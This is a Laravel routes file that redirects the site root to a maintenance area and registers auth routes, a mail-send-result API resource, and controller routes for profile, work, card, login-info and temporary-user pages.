<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return redirect('/maintenance');
});

Route::get('/maintenance', function () {
    return view('welcome');
});

Auth::routes();

Route::apiResource('/api/mailsendrslt', 'MailsendrsltController');
Route::get('/maintenance/home', 'HomeController@index')->name('home');
Route::get('/maintenance/profile', 'ProfileController@index')->name('profile');
Route::get('/maintenance/work', 'WorkController@index')->name('work');
Route::get('/maintenance/card', 'CrdcardinfoController@index')->name('card');
Route::get('/maintenance/logininfo', 'LogininfoController@index')->name('logininfo');
Route::get('/maintenance/tmpuserinfo', 'TmpuserinfoController@index')->name('tmpuserinfo');
